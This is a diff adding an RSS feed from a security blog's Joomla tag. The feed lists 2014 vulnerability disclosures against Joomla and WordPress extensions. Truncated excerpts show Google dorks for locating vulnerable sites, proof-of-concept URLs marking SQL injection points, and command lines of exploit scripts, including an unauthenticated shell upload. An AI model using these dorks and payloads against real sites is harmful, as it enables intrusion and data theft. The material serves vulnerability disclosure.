@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>joomla on HomeLab IT</title>
+    <link>https://www.homelab.it/tags/joomla/</link>
+    <description>Recent content in joomla on HomeLab IT</description>
+    <image>
+      <url>https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://www.homelab.it/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Thu, 13 Nov 2014 00:20:47 +0000</lastBuildDate><atom:link href="https://www.homelab.it/tags/joomla/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Joomla HD FLV Player SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/</link>
+      <pubDate>Thu, 13 Nov 2014 00:20:47 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/</guid>
+      <description>Info # Exploit Title : Joomla HD FLV Player 2.1.0.1 and below SQL Injection## Exploit Author : Claudio Viviani## Vendor Homepage : http://www.hdflvplayer.net/## Software Link : http://www.hdflvplayer.net/download_count.php?pid=5## Dork google 1: inurl:/component/hdflvplayer/# Dork google 2: inurl:com_hdflvplayer ## Date : 2014-11-11## Tested on : BackBox 3.x/4.x## Info: The variable &amp;#34;id&amp;#34; is not sanitized (again)# Over 80.000 downloads (statistic reported on official site)### Video Demo: http://youtu.</description>
+    </item>
+    
+    <item>
+      <title>Joomla RD Download Sql Injection</title>
+      <link>https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/</link>
+      <pubDate>Wed, 29 Oct 2014 14:55:07 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/</guid>
+      <description>claudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http://127.0.0.1_______ __ | _ .-----.-----.--------| .---.-. |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.. . | `-------&amp;#39; _______ ______ ______ __ __ | _ | _ \ | _ \ .-----.--.--.--.-----| .-----.---.-.--| ||. l |. | \ |. | \| _ | | | | | | _ | _ | _ ||. _ |.</description>
+    </item>
+    
+    <item>
+      <title>WordPress and Joomla Creative Contact Form Unauthenticated Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/</link>
+      <pubDate>Thu, 23 Oct 2014 22:19:50 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/</guid>
+      <description>claudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http://127.0.0.1/wordpress -f shell.php -c wordpress___ ___ __ __,-,__ | Y .-----.----.--| .-----.----.-----.-----. | &amp;#39; &amp;#39;__| |. | | _ | _| _ | _ | _| -__|__ --| | __| |. / \ |_____|__| |_____| __|__| |_____|_____| |_______| |: | _______ |__| __ |_| |::.|:. | | _ .-----.-----.--------| .---.-. `--- ---&amp;#39; |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Face Gallery 1.0 Multiple Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/</link>
+      <pubDate>Sun, 21 Sep 2014 22:57:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/</guid>
+      <description>####################### Exploit Title : Joomla Face Gallery 1.0 Multiple Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : https://www.apptha.com# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/150# Dork Google: inurl:option=com_facegallery# Date : 2014-09-17# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Info:# Joomla Face Gallery 1.0 suffers from SQL injection and Arbitrary file download vulnerabilities# PoC Exploit:## http://localhost/index.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Form Maker 3.4 and below SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/</link>
+      <pubDate>Fri, 12 Sep 2014 22:24:40 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/</guid>
+      <description>####################### Exploit Title : Joomla Spider Form Maker &amp;lt;= 3.4 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://web-dorado.com/products/joomla-form.html# Dork Google: inurl:com_formmaker# Date : 2014-09-07# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://localhost/index.php?option=com_formmaker&amp;amp;view=formmaker&amp;amp;id=[SQLi]&amp;#34;id&amp;#34; variable is not sanitized.####################### Vulnerability Disclosure Timeline:2014-09-07: Discovered vulnerability2014-09-09: Vendor Notification2014-09-10: Vendor Response/Feedback2014-09-10: Vendor Fix/Patch2014-09-10: Public Disclosure#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Contacts 1.3.6 and below SQL Injection vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/</link>
+      <pubDate>Wed, 10 Sep 2014 21:21:09 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/</guid>
+      <description>$$$$$\ $$\ $$$$$$\ $$\ $$\\__$$ | $$ | $$ __$$\ \__| $$ |$$ | $$$$$$\ $$$$$$\ $$$$$$\$$$$\ $$ | $$$$$$\ $$ / \__| $$$$$$\ $$\ $$$$$$$ | $$$$$$\ $$$$$$\$$ |$$ __$$\ $$ __$$\ $$ _$$ _$$\ $$ | \____$$\ \$$$$$$\ $$ __$$\ $$ |$$ __$$ |$$ __$$\ $$ __$$\$$\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \____$$\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \__|$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$ |\$$$$$$ |$$ | $$ | $$ |$$ |\$$$$$$$ | \$$$$$$ |$$$$$$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$ |\______/ \______/ \______/ \__| \__| \__|\__| \_______| \______/ $$ ____/ \__| \_______| \_______|\__|$$ |$$ |\__|$$$$$$\ $$\ $$\ $$\ $$$$$$\ $$$$$$\$$ __$$\ $$ | $$ | $$$$ | $$ ___$$\ $$ __$$\$$ / \__| $$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$$\ \_$$ | \_/ $$ | $$ / \__|$$ | $$ __$$\ $$ __$$\_$$ _| \____$$\ $$ _____|\_$$ _| $$ _____| $$ | $$$$$ / $$$$$$$\$$ | $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ / $$ | \$$$$$$\ $$ | \___$$\ $$ __$$\$$ | $$\ $$ | $$ |$$ | $$ | $$ |$$\ $$ __$$ |$$ | $$ |$$\ \____$$\ $$ | $$\ $$ | $$ / $$ |\$$$$$$ |\$$$$$$ |$$ | $$ | \$$$$ |\$$$$$$$ |\$$$$$$$\ \$$$$ |$$$$$$$ | $$$$$$\ $$\$$$$$$ |$$\ $$$$$$ |\______/ \______/ \__| \__| \____/ \_______| \_______| \____/ \_______/ \______|\__|\______/ \__|\______/j00ml4 Spid3r C0nt4cts &amp;lt;= 1.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Calendar 3.2.6 SQL Injection Exploit &#43; Demo</title>
+      <link>https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/</link>
+      <pubDate>Sat, 06 Sep 2014 09:16:25 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/</guid>
+      <description>$$$$$\ $$\ $$$$$$\ $$\ $$\\__$$ | $$ | $$ __$$\ \__| $$ |$$ | $$$$$$\ $$$$$$\ $$$$$$\$$$$\ $$ | $$$$$$\ $$ / \__| $$$$$$\ $$\ $$$$$$$ | $$$$$$\ $$$$$$\$$ |$$ __$$\ $$ __$$\ $$ _$$ _$$\ $$ | \____$$\ \$$$$$$\ $$ __$$\ $$ |$$ __$$ |$$ __$$\ $$ __$$\$$\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \____$$\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \__|$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$ |\$$$$$$ |$$ | $$ | $$ |$$ |\$$$$$$$ | \$$$$$$ |$$$$$$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$ |\______/ \______/ \______/ \__| \__| \__|\__| \_______| \______/ $$ ____/ \__| \_______| \_______|\__|$$ |$$ |\__|$$$$$$\ $$\ $$\ $$$$$$\ $$$$$$\ $$$$$$\$$ __$$\ $$ | $$ | $$ ___$$\ $$ __$$\ $$ __$$\$$ / \__| $$$$$$\ $$ | $$$$$$\ $$$$$$$\ $$$$$$$ | $$$$$$\ $$$$$$\ \_/ $$ | \__/ $$ | $$ / \__|$$ | \____$$\ $$ |$$ __$$\ $$ __$$\ $$ __$$ | \____$$\ $$ __$$\ $$$$$ / $$$$$$ | $$$$$$$\$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ | $$ |$$ / $$ | $$$$$$$ |$$ | \__| \___$$\ $$ ____/ $$ __$$\$$ | $$\ $$ __$$ |$$ |$$ ____|$$ | $$ |$$ | $$ |$$ __$$ |$$ | $$\ $$ | $$ | $$ / $$ |\$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\ $$ | $$ |\$$$$$$$ |\$$$$$$$ |$$ | \$$$$$$ |$$\ $$$$$$$$\ $$\ $$$$$$ |\______/ \_______|\__| \_______|\__| \__| \_______| \_______|\__| \______/ \__|\________|\__|\______/j00ml4 Spid3r C4l3nd4r &amp;gt;= 2.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider video player 2.8.3 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/</link>
+      <pubDate>Tue, 26 Aug 2014 18:41:55 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/</guid>
+      <description>####################### Exploit Title : Joomla Spider video player 2.8.3 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://extensions.joomla.org/extensions/multimedia/multimedia-players/video-players-a-gallery/22321# Dork Google: inurl:/component/spidervideoplayerinurl:option=com_spidervideoplayer # Date : 2014-08-26# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://localhost/component/spidervideoplayer/?view=settings&amp;amp;format=row&amp;amp;typeselect=0&amp;amp;playlist=1,&amp;amp;theme=1&amp;#39;&amp;#34;theme&amp;#34; variable is not sanitized.#####################Discovered By : Claudio Vivianihttp://www.homelab.itinfo@homelab.ithomelabit@protonmail.chhttps://www.</description>
+    </item>
+    
+  </channel>
+</rss>
